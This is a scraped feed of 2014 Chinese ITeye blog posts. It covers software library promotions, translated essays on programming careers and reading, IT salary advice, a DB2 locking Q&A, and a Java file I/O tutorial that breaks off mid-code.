        Aspose.Note类库是 Microsoft OneNote Object Model 的一个替代品，能提供更好的性能。它操作文本和内容的先进功能使得Aspose.Note 库成为一个强大的编辑工具。API是可扩展的。简单易用。它让开发人员能够轻松访问标准功能，因此开发人员在执行常规任务时只需编写更少的代码。
         
      Aspose.Note 以那些需要在自己应用中处理OneNote文件的开发人员为目标，让他们能够快速轻松操作文件格式，在开发处理OneNote文件的解决方案时节省时间。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
免费下载Aspose.Words for .NET示例大全, wolfscry.iteye.com.blog.2056970, Tue, 29 Apr 2014 11:39:52 +0800

为了更好的学习Aspose.Words for .NET有必要下载一些示例自己操作。首先要有最新版本的Aspose.Words for .NET。然后下示例大全压缩包。压缩包提供的所有示例都有单独的C#和Visual Basic项目文件。每个示例都包含一个 Program.cs或Program.vb代码文件。可直接点击下载该示例包，里面还包括了Microsoft Visual Studio 2005, 2008, 2010 和2012解决方案文件。 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
分享一些FusionMaps的教程案例资讯疑难解答, wolfscry.iteye.com.blog.2054153, Thu, 24 Apr 2014 15:33:11 +0800

最近在用Fusionmaps 作图，发现一个不错的资源，在此分享记录下。
Fusionmaps 虽然工作原理并不是那么复杂，但要想把图做的丰富就也还是比较困难。网上也有一些关于Fusionmaps 的文章资讯，但跟其他地方的都差不多，而且很少的，没几个原创，帮助不大。前天看了几篇Fusionmaps 的教程连载，很多内容都还不错，它上面分享了一些代码的，我们作图的时候可以借鉴。下。文章包括：用JavaScript地图工具FusionMaps绘制你的第一张世界地图用JavaScript地图工具FusionMaps制作中国地图教你用JavaScript地图工具FusionMaps改变地图大小用JavaScript地图工具FusionMaps在同一页面中嵌入多张地图用JavaScript地图工具FusionMaps在相同页面集成地图和图表
；；
其他还有很多疑难解答，自己去翻看把
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
做程序员之后才知道的 5 件惊奇事-人际、协作很重要, wmcxy.iteye.com.blog.2063508, Thu, 08 May 2014 07:58:24 +0800

本文由 伯乐在线 - 吴鹏煜 翻译自 Henrik Warne。欢迎加入技术翻译小组。转载请参见文章末尾处的要求。
从我开始工作算起，已经有20多年了。即便如此，我依然记得当时对从大学毕业并开始工作的憧憬。在那之前，除了少数几份和编程无关的暑期工，我的人生基本都是在学校度过的。虽然我对工作的大多数期望都实现了，不过在步入职场头几年中也发现这一行许多令人惊奇的事，下面是头五件：
 
5. 人际交往
编程看起来是一份相当孤独的工作——你需要完成一个功能，所以你坐下来并用代码将其实现。不过事实上，你和其他的同事会有相当多的交流。你会和同事讨论设计，你会在开会时审查新功能，你会和测试人员讨论你的代码。
学会委婉和圆通，在交流中非常有帮助。如果还不会，那你得去学一下。关于这方面，有一本畅销书——卡耐基的《人性的弱点》。如果还没有读过此书，我强烈建议你读一读。
 
4.写作很重要
通过写作清晰地表达观点，这很有帮助。从某种程度上来说，写代码和写作非常相似，两种都需要你把你的想法，通过某个结构化的方式清晰并且无歧义的表达出来。Email当然是写不完的了，不过还有你所开发的产品特性所配套的文档、需要清晰描述Bug的漏洞报告、还有对你修复的Bug做出的解释。在大学里写作并不是重点，但是如果你写作好的话，这绝对是工作中的一个筹码。
 
3.从来没有已做完的软件
在我开始工作以前，我觉得当我开发出一个特性之后，这个特性就算开发完成了。不过在现实中，你会很经常的要回到这个特性上来。有时候是因为这并不完全是客户所要求的，也可能是因为你需要为它添加更多功能，又或者是你想要把有些相似的功能合并起来，或者修复一个Bug。不管怎么样，对你的代码继续进行编程是很正常的事。
在大学里，我们经常会把一个程序从头做起，但这在现实世界中几乎是没有出现过的。当然，除了你做新功能的时候，但这些代码总要融入旧代码。正因为如此，做新功能时的很大一部分工作都是在阅读并理解旧代码。这是一项我们在学校里没有练习过的技能。
（伯乐在线补充：这一点和乔纳森·丹尼可在《风雨20年：我所积累的20条编程经验》中的第 19 点一样的。）
 
2.很少有巧妙的算法
在大学里我得到了一个计算机科学与工程的硕士，我学习了通信系统，里面包括信号处理、错误纠正码、排队论等等的课程。我们也有像算法和数据结构这样的计算机科学核心课程，我很喜欢这些课，我觉得学会这些聪明的算法和数据结构是一件很酷的事，所以我非常期待在工作中见到它们。
我的第一份工作是在蒙特利尔的爱立信公司，在一个蜂窝网络的移动电话交换中心担任软件工程师。那里有大量的代码来控制通话的建立、挂机、漫游等等，但当我看到这些功能都是用最基本的数据结构和算法完成时，我觉得有点失望。最有趣的是，我发现用来跟踪用户漫游状态的代码居然是由一千多个二叉树构成的，用户手机号的末三位数决定了用户处于哪颗树上。当需要找到这个用户时，根据用户的手机尾号找到用户所在的树，然后遍历该树以找到该用户。除了这个，其他的都是链表甚至是更简单的数据结构。
 
1.系统集成后的复杂性
说起来既然没有什么精巧的算法，而且整个应用程序都在使用基本的数据结构，那看来在这里工作应该没有什么挑战吧？错！我很快就意识到这套系统高度复杂，倒并不是因为那些复杂的功能，而是因为太多太多简单的功能集成合到了一起。
在我工作过的那么多套系统中，我看到了一些共同点：大多数特性都非常简单，但正因为就是有很多简单的特性，在集成这些特性之时所遇到的微妙（或不那么微妙）交互，就引发了Bug。
 
相关阅读：
在IT行业工作如何获得高薪？选择前沿的技术，把准方向，有技术有人缘   
 
工作7年，对技术的感悟与理解  
 
IT人为什么难以拿到高薪？
 
 做程序员之后才知道的 5 件惊奇事-协作、交际 
 
欢迎访问我的微博
程序员能力矩阵 Programmer Competency Matrix
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Jeff Atwood：程序员都不读书，但你应该读, wmcxy.iteye.com.blog.2059903, Mon, 05 May 2014 07:57:13 +0800

英文原文：Programmers Don’t Read Books — But You Should 来源：外刊IT评论 
问答网站stackoverflow.com的一个主要功能体现就是：软件开发人员无需再从书本上学习编程，就像Joel所说的：
程序员看起来都不再读书。市场上编程方面书籍的数量和编程从业人数相比来少的可怜。
2004年在《The Shlemiel Way of Software》一书中Joel也表达了相同的观点：
大部分的人都不读点什么或写点什么。大部分的程序员都不读软件开发方面的书籍，他们不去软件开发方面的网站，他们不去Slashdot参与讨论。
既然现在的程序员都不读书，他们如何学习编程？他们用最原始的方式：捋起袖子就写代码——同时开启第二个窗口来从互联网收集经验和知识。互联网是一部百科全书。获取知识信息更快，更高效，从网上获取编程知识明显是一种更聪明的方法。Doug McCune在《Why I Don’t Read Books》这篇文章里贴切的写出了他的感受，我相信他描述的这种心情是相当普遍的。
我认为技术图书出版业应该为此承担主要责任：
大部分编程书籍都写得很烂。写书出版的门槛，就我个人发现，已经基本上不存在了。图书出版业虽然很热闹，但这并不能说明它能提供比你在广袤的互联网上找到的更好的内容。虽然每年都有成百上千的编程图书上市，但也许可能只有2、3本是值得你花时间去读的。
编程书论斤买，而不是论知识量。我们会有这样一种感觉，编程书籍的厚度跟它的内容质量似乎成反比。书的部头越大，里面所承载的有用信息越少。那些动辄上千页的参考书究竟有什么用？你真的会用它来查找吗？拿着都费力。
都是面向新手的速成编程书籍。我丝毫没有反对新人进入编程领域的意思。但我从来都是认为“24小时[某种编程语言]速成教程”这类书对我们的这种职业是有害的。这种书都灌输着一种短视的思想，求快，求最简单的省事的做事方法，这导致初学者误入歧途——或就像我喜欢提到的，“PHP”。玩笑！玩笑！
编程书籍seqing化。有些人认为把一大摞厚厚的，看起来很重要的编程书放在案头——基本上没看过——会映衬出是一个水平很高的程序员。正如David Poole曾经有一次在邮件中跟我说的，“这种事情我是绝对不会做的”，说的正是这些编程书籍seqing化的现象。这也是我经过思考决定拒绝购买Knuth写的《计算机程序设计艺术》一书的原因。我们应该去买有实践价值的书，你真正会去读的书，更重要的，你能拿来实用的书。
作为一名书作者，我很惭愧。我和别人也合写了一本编程书，而且我并不认为你应该买它。我不是在说反话。我想说的就是字面上的意思。但不管怎样，那并不是一本很糟糕的书。我对我的书合作者怀有最大的敬意。但你能从网上找到比这本书更丰富的信息。抱着一本死书不放是最不可取、最浪费生命的事。
互联网无疑正加速编程书籍的死亡，但有一些证据显示，甚至早在互联网诞生之前，很少有程序员遍读大量编程书籍。我很吃惊的在《代码大全》一书中看到了这样的段落：
你可以炫耀一下了，因为你在读这本书。你已经学到了比软件产业里大部分人都要多的知识，因为大部分的程序员一年都不会读一本书(DeMarco and Lister 1999)。每天读一点，坚持不懈，你就能成为专业高手。如果你能每两个月读一本好的编程书，大概一周35页，你很快就能对业内的知识有坚实的掌握，能很快让你从周围所有的人中脱颖而成。
我相信早在《代码大全》1993年第一版时里面就有这样的原话，但我们无法证实，因为没有那一版的书。经过这网上的搜索，发现了Steve McConnell在《人件》中引用的段落：
关于读书情况的统计数字让人非常的泄气：比如，大部分的软件开发人员手头上都没有一本关于他们的工作方面的书籍，更不用说读过一本。这事实让人对这个领域里的工程质量感到担忧。而对于我们这些写书的人，那更是悲剧。
我很痛心的读到reddit上的这些评论，看到人们把stackoverflow.com网站的宗旨使命理解为对编程书籍的否定。怀着一种对当前编程书籍市场复杂的心情，我要说，我喜欢编程书！我这个编程博客就起始于一篇推荐程序员必读书籍的文章开始的。很多我的文章都是在讲述我对于一些经典编程书籍里的核心思想浅显的理解。
如何让这看似矛盾的语句能够调和，如何能统一这动态的爱与恨？你看到了没有，处处都有编程书籍，处处都有编程书籍。
优秀的编程书是没有时间限制的。它们会超越语言的限制，IDE的限制和平台的限制。它们不是解释how，而是why。如果你每隔5年就不得不清扫一下书架，那请相信我，你买错了编程书。
我的编程书柜是任何东西都换不去的。我无时不刻都在使用它他们。事实上，我写这篇文章时就翻阅了它们数次。
我不想再复述我的这些推荐的读物，因为这些年我一直在拿它们炫耀。
可我必须要号召的是：我最喜爱的五本最重要的编程书，你们每个正在从事编程工作的程序员都应该有拥有——并且要读。这些种子读物，极富实用价值，年复一年，不论我做什么样的编程工作，它们从未贬值。它们值得一读再读，每次我有了更多年的经验，回来重新阅读它们，都会让我对软件工程获得更深更明锐的认识，如果你还没有拥有这些书，那你在等待什么？
《代码大全》
《点石成金》
《人件》
《程序员修炼之道
《软件工程的事实与谬误》
 
 
 
 
 
 
 
 
 
 
我的主张，让 stackoverflow.com这样的网站成为这里永恒经典编程书籍的有益补充。没有任何途径，东西，形式能替代这些书籍。
另一方面，如果你不幸是《Perl语言傻瓜书》的作者，那你要留意你的背后，因为我们很明确就是在针对你。
 
推荐阅读：
在IT行业工作如何获得高薪？选择前沿的技术，把准方向，有技术有人缘  http://www.it51share.com/archives/3520
 
 
工作7年，对技术的感悟与理解  http://www.it51share.com/archives/3612
 
IT人为什么难以拿到高薪？http://www.it51share.com/archives/3612
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
画图解释SQL联合语句, wmcxy.iteye.com.blog.2059900, Mon, 05 May 2014 07:49:20 +0800

 
英文原文；Jeff Atwood，编译：伯乐在线 – @奇风余谷
http://www.it51share.com/archives/3897
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
IT人为什么难以拿到高薪？, wmcxy.iteye.com.blog.2059321, Sat, 03 May 2014 10:48:26 +0800

 
最近在论坛里看到很多人发牢骚，说薪水少，可在我看来，你们这样的人拿得到高薪才怪！
我先问一句：这里有多少人是本科的？有多少人是正规本科的（不算自考，成考和专升本）？有多少人是有学位的？有多少有学位的是拿着网大排名前50所大学的学位的？恐怕是少之又少吧！在中国，薪水和学位的关系对于应届生来说是绝对的，即使对于以后的发展，学位也很重要，要不那些低学历的人评职称为什么吃亏呢？你可以告诉我这不合理，不错，这确实不合理，但却是现实。如果你不能改变现实，那还是适应它吧！你也可以告诉我低学历一样可以拿高薪，我承认，不过你要准备比别人多付出10倍以上的努力。
接下来是语言，这里恐怕是有不少人没有过四级没学位的吧？有多少过六级的？有多少过专四专八的？有多少有其他英语证书的？你不要和我说你的水平好，可不喜欢中国的考试制度，所以没证书。在中国，毕业一开始的几年就是靠证书，你有本事跳过１楼２楼造３楼吗？如果你英语不行，你有其他二外吗？要知道，老外对于it的重视可是比国内那些买的电脑做装饰品的土老帽要强得多。
其实这些都不是最重要的，最重要的做人的风格，现在很多it人除了技术什么都不懂，整天得罪人。哪怕你是四个ccie全考出的，我不用你难道地球就不转了？中国多的是人，技术有什么了不起的？更何况很多技术是根本用不到的。
现在总看到一些所谓的“技术牛人”在误导新人，你们知不知道你们是在误人子弟啊！自己混不出头，还要去害别人，今天要和你们好好算算帐。
先自我介绍一下，我是98年从上海交大毕业的，在Microsoft（MS）工作了6年，现在在一家系统集成公司工作。
第一个意见：读书最重要，就是为文凭。我承认大学里确实学不到什么东西，但为了文凭请一定要认真读。这个社会要文凭，没办法。还有大学成绩要读好一些，像ms,cisco,oracle这些大公司是会看的。读大学还有一个好处是大学很空，你可以自己去学想学的东西，不过学校的功课永远是最重要的。那些大专的不要以为本科生学不好技术，确切得说并没有几个优秀的学生是书呆子。没有什么规定说大专生学技术有优势。
第二个意见：好好读英语，要想在it立足，英语是必须的。至少要过六级，如果能有专八或者中高口证书或者bec什么的就更好，最好还要有二外，可以考虑德语或者日语。作it一定要去外企，国企绝对没前途。
第三个意见：要认真选择入的行业。it是非常广泛的概念，网络只是其中一个非常小的（而且也是非常没有前途的）领域。it最有前途的领域是什么？是开发，开发中最有前途的是什么？是硬件开发，也就是电子工程，那些家伙的月薪差不多是我的年薪（我现在月薪是税后10K）；其次是软件开发，不过很苦，而且需要不错的数学基础，不过在中国不要去搞通用件开发，一盗版全完，最好是搞ERP类的专用系统开发，连开发带维护都有了。如果你没有数学基础，却有不错的美学功底，那就去搞设计，photoshop也好，autocad也好，3dsmax也好,flash也好，视屏后期处理也好，但不要搞网页设计（无论是前台还是后台），因为一个人作的模扳一万个人用，不会有好的收入的。再不行就来搞网络和系统，这个方面最好搞数据库，不过这样又要涉及到开发，如果搞网络也要搞部署（系统集成），或者去大公司作技术支持，最差的就是作维护了。
为什么说维护是最次的？因为无论是什么公司，维护都不是主营业务，或者说，不会为公司带来收入。在公司，能直接影响利润的部门收入才高，所以说任何企业，最重要的是销售和市场，其次是研发和生产，至于我们维护部门，不过是和扫垃圾的和扫厕所的一个级别而已。
维护虽然是最差的，但不代表不能拿高薪。首先，要去大的外企，他们对于it部门的重视程度高。第二，要学会为人处世，我们本来就是服务部门，所以对其他部门的人要热情一些，主动一些，不要老摆个“高手”的臭架子。要知道，技术如果不能换钱，那不过是垃圾而已。第三，不要老是问老板要钱换设备，我们已经不能产生利益了，就要让老板感觉我们能节约管理成本，我们的任务是最大限度利用现有的设备，而不是整天采购新的设备。
即使如此，我所谓的高薪不过是在维护这个领域里的高薪而已，和其他主要部门是不能比的。所以最好还是跳出这个行业的好，去作系统部署。而作系统部署不要去做部署人员（即使暂时作，将来也一定要做项目经理），这是民工都可以做的。或者就是做方案销售，这样你就是企业的主营业务了。
顺便说一下我对认证的看法，相对与学历和英语，它是最不重要的。当年我去ms，靠的不是什么mcse，而是我的专八和名校学历。ms的面试并不关心你的技术，而是关心你是否聪明，是否能溶入企业文化。还有，国内好象很多人对ms不满，因为软件太贵了，这些钱都进了我们这些技术支持的口袋了，不错，ms的员工薪水很高，可这是我们努力工作换来的，我们每天都要工作12小时左右，xp刚发行那段日子xp组的工程师都要工作到凌晨2-3点，白天还是9点上班，难道我们不该拿高薪吗？至于mcse我是进ms后再考的，没有看过书，全是靠*****过的，也就是你们所说的paper，不过我想说一句，对于应届生，你不用在意自己是不是paper，因为企业已经默认你是paper了，所以无所谓的。
总结一下，it界不是没有高薪，而且it的高薪在所有理工类行业中是高的。关键是看你自己的能力。对于还没毕业的同学，我希望你们能先认真读书，至少拿个学士出来（最好是名校的），然后看看能不能考上好的大学的硕士，同时学好英语，多参加社会活动，即使你作it，技术也不过只有20%的比重而已，重要的是沟通和为人处世的技巧。对于刚出来的大学生，我的意见是先苦几年，多考一些外语和it的证书，准备向外企跳。
最后一句，我所说的也许确实不好听，但事实如此，你可以举很多反例来反驳我（中专生拿高薪之类的），但这些例子是不能反映总体情况的，不信我们可以抽样调查。还有，中国有很多现状是不合理的，但你不能改变它，那要么你适应它，要么你毁灭。在沙漠里谁能活下来？是万物之长的人还是骆驼？
 
推荐阅读：
在IT行业工作如何获得高薪？选择前沿的技术，把准方向，有技术有人缘  http://www.it51share.com/archives/3520
 
 
工作7年，对技术的感悟与理解  http://www.it51share.com/archives/3612
 
IT人为什么难以拿到高薪？http://www.it51share.com/archives/3612
已有 42 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
思考问题时，与其休息，不如散步, wmcxy.iteye.com.blog.2059190, Fri, 02 May 2014 11:27:33 +0800

 
 
我们被教导并相信“严肃的”成果是坐在我们的办公桌前获得，但其实走出办公室更可以刺激工作效率。研究者发现，散步不仅仅是一种锻炼或放松的途径，它也能提高创造力、提升你的心情，，还可以促进新想法的产生。如果你一直坐在办公桌前，被电子邮件、同事不断分散着注意力，那么不如去散散步，这可以让你更好地集中注意力。当独自行走时，你可以演练一下一个演讲，在心里为一个困难的会谈做好准备，抑或深入思考一个棘手的问题。散步时也是进行专业性的心灵交流的好时机，因为一起走动的时候谈话不再那么僵硬，而是更真实了。你也会发现散步时景色的变化要比一块白板更能有效地激发你的思路，所以当你需要解决什么难题时，试试出去散个步吧！
 
 
http://www.it51share.com/archives/3774
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
不懂技术的人不要对懂技术的人说这很容易实现, wmcxy.iteye.com.blog.2056445, Tue, 29 Apr 2014 07:19:11 +0800

“这个网站相当简单，所有你需要做的就是完成X，Y，Z。你看起来应该是技术很好，所以，我相信，你不需要花费太多时间就能把它搭建起来。”
 
我时不时的就会收到这样的Email。写这些邮件的人几乎都是跟技术不沾边的人，或正在研究他们的第一个产品。起初，当听到人们这样的话，我总是十分的恼怒。他们在跟谁辩论软件开发所需要的时间？但后来我意识到，即使我自己对自己的项目预测要花去多少开发时间,我也是一筹莫展。如果连我自己都做不好，我何必对那些人恼怒呢？
 
真正让我郁闷的不是他们预估的错误。问题在于他们竟然认为自己可以做出正确的估计。作为开发人员，我们经常会发现，在软件开发的问题上，一个外行人会很自然的把复杂的事情估计的很简单。
 
这并不是为我们的愤怒找借口。但这引起了另外一个有趣的问题：为什么我们天生的预测复杂性的能力在遇到编程问题时会失灵？
 
为了回答这个问题，让我们来认识一下我们的大脑如何估计事情的。有些事情对于一些没有经验的人也很容易预估正确，但有些事情则不然。
 
我们来想想观看一个人弹吉他。即使你从来没有弹过吉他，在观看了一场弹奏《玛丽有只小羊羔(Mary had a Little Lamb)》的吉他表演后，你也能大概推测出这很简单，一个人不需要太高的技术就能演奏出来。同样，当观看了有人演奏D大调的《卡农(Pachabel’s Canon)》后，你也很容易推测出，这很复杂，需要很长时间的练习才能演奏的出来。
 
为什么我们能够很迅速准确的预估这两首曲子的复杂性呢？这是跟我们用来判断一个事情简单和还是复杂的方法有关的。我们的大脑有一些现成的模式来完成这些事情，首先一个就是根据速度。这种情况下，大脑会辨别每秒钟演奏的东西。根据每秒钟演奏了多少东西，我们很容易有一个直观的判断曲子的复杂度。因为用吉他演奏一首歌是一种物理过程，一种感官上的活动，我们的大脑很容易依此来推测速度，继而转换成复杂度。
 
我们还有另外一个天生的推测依据：体积。想想把一个帐篷和一栋公寓放在一起对比。即使一个人从来没有学过建筑学，他也能告诉你通常设计和建造一个帐篷会比设计和建造一栋公寓要简单。为什么？因为我们天生的会使用物理体积作为事物复杂性的一个指标。
 
当然。上面说的这两种逻辑分析并不是总是100%的有效。但大多数情况下，人们就是这样干，而且很成功。大多数情况中，我们在对物理过程评估时，我们的大脑会对物理事物进行有效的关联，不需要依赖之前的经验。
 
现在让我们来谈谈软件。当一个不懂技术的人试图对软件开发时间进行评估时，有两个很基本的直观指标在辅助他们：以体积为指标的复杂度和以速度为指标的复杂度。但他们没有意识到，软件跟他们想象的不一样。软件本质上不是有形物质。没有体积和速度。它的极小的组成部分可能会时不时的在电脑屏幕上闪现。正因为如此，当面对开发一个web应用时(或任何类型的软件)，我们的基本直观感觉失效了。
 
这第一点，速度，很显然根本不可能被外行人拿来对软件进行评估。于是很自然的，他们倾向于使用体积指标进行评估。要么是根据描述文档的页数，要么是根据软件的功能用例数或特征数。
 
有时候，这种评估手段确实有效！当面对一个静态网站，没有特别的设计要求，外行人很容易用这种方法估计出开发时间。但是，通常情况下，对于软件开发，体积并不能真实有效的反映复杂度。
 
不幸的是，对于软件的复杂度，唯一有效的推测方法是依据经验。而且还不是时时都好用。作为一个程序员，我知道，根据我之前开发过的相似的功能特征，我可以估计出现在的这些功能特征各自要多少开发时间。然后，我把总时间加起来，这就得到了完成整个项目需要的大致时间。然而，事实情况中，每个项目在开发过程中都遇到二、三个瓶颈。这些瓶颈会肆意的消耗程序员的大量时间，你在遇到它们之前根本不会有所预见。它们会拖住整个项目，致使工期延后数周甚至数月。
 
这些是没有经验的人在评估复杂度时不会理解的。他们不明白在其他事情上都很灵的方法，为什么放到软件开发上就不灵了。所以，下一次当你听到有人说“我想你几天时间就能把它开发出来”时，不管是谁说的，都不要懊恼。深呼吸一下，告诉他这篇文章的地址，自己该干什么还干什么。
 
http://www.it51share.com/archives/3603
已有 11 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
在IT行业工作如何获得高薪？选择前沿的技术，把准方向，有技术有人缘, wmcxy.iteye.com.blog.2055936, Sun, 27 Apr 2014 23:11:47 +0800

在这个变化的年代，IT人的方向在哪里？看两个故事
王超是我的朋友，来京四年整。最初在一家民企做LINUX运维工程师，月薪5000。工作很认真，埋头苦干型，每天工作时间很长，让加班从来无怨言。即使是周末休假，只要有工作任务也是随叫随到。然而当他提涨薪时，企业说是要考虑考虑。一两个月后这事杳无音讯。他离职了，跳槽到一家私企做系统工程师，月工资7000，工作稳定，工作内容也固定，继续埋头苦干，每天把自己的工作做好。一年后有涨薪，幅度10%。这样又两年，工资到了8500，依然感觉日子很难熬，买不起车更买不起房，羡慕高薪的人。当然他性格内向，不善沟通和与领导交流，技术能力中等，交给他的活也总能干完，但这样一直干下去么，高薪会青睐他么？
李建是我的一个前同事，做ORACLE数据库的，OCM认证通过者，技术能力很强。先是在外企做数据库运维，月薪12K，因为不喜欢上司的做事风格和公司的管理制度，干了一年后离职。之后跳槽至国内一家比较有名电子商务公司，月薪16K，处理技术问题很有自己的一套，但是喜欢沉浸在技术世界里，不喜欢与人交流也很傲气。然而技术是越来越厉害了，干了两年还是无法涨薪。每逢遇到问题，总是觉得自己是权威，所有人都得听他的，别人说什么也听不进去，甚至直接顶撞技术总监。而与之同时进公司的一个同事，技术不是很牛但是为人处事不错，很快当部门经理了，工资早已过20K，心里渐渐不平衡，随后辞职去了另一家私企，还是做数据库运维，工资17K。高薪依然渐行渐远，他为此郁闷。
赵东我的一个朋友，做项目经理，主要负责云计算和虚拟化的项目。技术好，沟通能力强，有一个PMP认证，在京城混了五年多，起初月薪15K现在月薪30K，由于业内人缘不错，马上去一家知名公司，年薪60万，算是IT界高薪了吧。
纵观IT界，高薪有几何？你是埋头苦干型、技术实力派还是善于人际沟通与管理，看完上面三个故事，你有何感想？
关于第一个故事，我的建议和想法是：
现在的人们生活节奏太快，工作也过于辛苦，以至于他们很容易忽略生活与工作的平衡。人们总是自己埋头苦干，很少抬起头来看看到底进展如何。于是，他们便错过了很多改善现状的机会。一个人埋头苦干的时间越长，他就越感到寂寞，而他的工作也越来越容易受到孤立。尽管是由工作引起的，但它的影响还会波及个人生活。生活中除了工作就是工作。而且你做的事情越多，就会有更多的事情要去做。这简直就是个无底洞啊！你要做的是停下来，花点时间思考，提醒自己，不要再一味地埋头工作，详细地分析一下你工作中存在的问题。为什么这样说呢？因为这就好比你驾驶着汽车以每小时160公里的速度在高速公路上飞驰，你考虑的只是保证汽车不偏离车道，而无法注意到路边的风景和留心你身边的人在做什么想什么。当你静下心来，开始思考工作以外的一些事情，关注自己身边的人和事，你就会发现自己的问题。当你找到了问题，继而明确下一步前行的方向，你的涨薪才有希望！
于第二个故事，我的建议和想法是：
术也很重要，但最重要的是做人的风格，学会与同事和领导相处。现在很多IT人除了技术什么都不懂，整天得罪人。琐碎的小事不愿做，关键的大事搞不定。哪怕你是CCIE、RHCA、OCM全考出的，我不用你难道地球就不转了？再说了，你考的高级认证越多，无形中别人对你的期望值也越高，你实际的技术能力是否和那些高级认证匹配，这些在企业里都是需要考量的，几张证书不能说明什么。切记，技术是用来解决问题的，不是拿来炫耀和自傲的，更何况很多技术在企业也不是全部用得到的。先做人后做事，古有此理也。心态转变一下，世界可以变的更美好，高薪也不是遥不可及。
关于第三个故事，我想大家可能跟我的想法一样，选择前沿的技术，把准方向，有技术有人缘，好的工作机会总是等着你。
总结一下，IT界不是没有高薪，关键是看你自己的能力。对于还没毕业的同学，我希望你们能先认真读书，至少拿个学士出来，同时学好英语，多参加社会活动，即使你作IT，技术也不过只有40%的比重而已，重要的是沟通和为人处世的技巧。对于职场人士，引用老男孩的一句话“技术是根基，沟通是桥梁，思想是灵魂。”因此，光会技术是远远不够的，这点大家一定要认识清楚。
当然，职场中还有很多现状是不合理的，你也看到某人不学无书也没什么能力依然拿着高薪，或者只因他的机遇好很容易的拿到了高薪，但这只是个别现象，我们不能以偏概全。很多时候，我们仍然要靠自己的实力和不懈的努力，才能走向更大的舞台，实现自己的高薪梦和人生的价值。现实中有些东西，如果你不能改变它，那要么你适应它，要么你毁灭。在沙漠里谁能活下来？是万物之长的人还是骆驼？所以物竞天择适者生存，为了高薪，我们需要做的是不断改变和提升自己。
在IT行业工作如何获得高薪？选择前沿的技术，把准方向，有技术有人缘
http://www.it51share.com/archives/3520
已有 18 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
update时order by的问题, wmcxy.iteye.com.blog.2055567, Sat, 26 Apr 2014 11:20:22 +0800

对一张10w条记录的标进行update，1000条记录提交一次。
在这期间需要对该表做一个select * from table order by xx的操作
但是好像在update完成之前不会返回结果。
请问是不是update的时候order by是要等待前面锁的释放的阿？
如果想要在update的时候完成这个Order by操作，应该怎么做？
谢谢
数据库的隔离级别是默认的隔离级别，游标级的
 
回答：
if it's CS, when the query get to the rows that being locked by the update transaction, it will wait until the lock is released....
then in this case, you should use isolation level = UR to do it
select * from table order by xx with UR
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
为什么别人愿意与你相处？有用，有料，有量，有心, wmcxy.iteye.com.blog.2055514, Sat, 26 Apr 2014 08:20:01 +0800

 
 
第一，你有用
 顾名思义，你能够带给别人实用价值。这说明，在社会人际交往一开始注重的都是一些实实在在的东西。你的能力、知识、技能、见识、力量等都会为你吸引一群慕名者。因为你对他们来说有用。所以，要想有个好人缘，不是简单依赖长相和气质，你的能力才是最重要的。
 
第二，你有料
 有料，包含两层含义，一是说明你这个人有内在的东西，懂得很多，经历过很多，社会经验和人生阅历很多。与你在一起相处，能够扩展自己的见识，放大自己的格局。二是说明你这个人懂得生活，充满趣味，幽默。和你在一起可以笑声不断，不会觉得闷。
 
第三，你有量
 所谓“海纳百川有容乃大”。你气度大，懂得包容。而现在许多人在一个社会大环境中都变得没有容量和自私，但是他们都渴望得到别人的包容。你能耐心听他们说话，并且然后做出一个中肯的判断和评价。这对他们来说是求之不得，觉得你是一个值得交往的人。
 
第四，你有心
 信任在这个社会上已经严重缺失了，但是每个人心中十分向往着信任。用心交朋友，会让别人感到前所未有的信任感。一个人只要用心在交流，而是不是用嘴，那么你所获得人脉会更长久，而且你的人脉会变成金脉。
已有 6 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
有错就改，当然是件好事。但我们常常却改掉正确的，留下错误的，结果是错上加错, wmcxy.iteye.com.blog.2055465, Fri, 25 Apr 2014 21:27:16 +0800

麦克走进餐馆，点了一份汤，服务员马上给他端了上来。
 
　　服务员刚走开，麦克就嚷嚷起来：“对不起，这汤我没法喝。”
 
　　服务员重新给他上了一个汤，他还是说：“对不起，这汤我没法喝。”
 
　　服务员只好叫来经理.
 
　　经理毕恭毕敬地朝麦克点点头，说：“先生，这道菜是本店最拿手的，深受顾客欢迎，难道您……”
 
　　“我是说，调羹在哪里呢？”
 
　　顿悟：有错就改，当然是件好事。但我们常常却改掉正确的，留下错误的，结果是错上加错
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
文件I/O流，及浅显加密解密, 429899791.iteye.com.blog.2064193, Fri, 09 May 2014 10:22:49 +0800

             I/O流在文件中尤为重要，尤其是文件中，我们鼠标中让你一天中用到最多的什么
复制，粘贴，剪切，新建，删除，等等都涉及到了文件操作，我们在感叹方便之余是不是也想实现这一功能呢，
其实我们在安装windows时候，这些代码就已经被编好，并且快捷到我们鼠标右键中，方便我们的使用，然而在使用着这些应用时，也想自己做出这样的代码，于是在刚刚学了I/O流之后，就可以动手操作了，在学会了读写之后，就可以添加COPY
也就是复制，粘贴·功能，之后的加密解密就迎刃而解了。
以下是关键代码：
package 文件;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
public class File {
	
	//实现读的功能
	public void read(String filename){
		try {
			//接收定义文件名为filename的文件，若不存在则报错
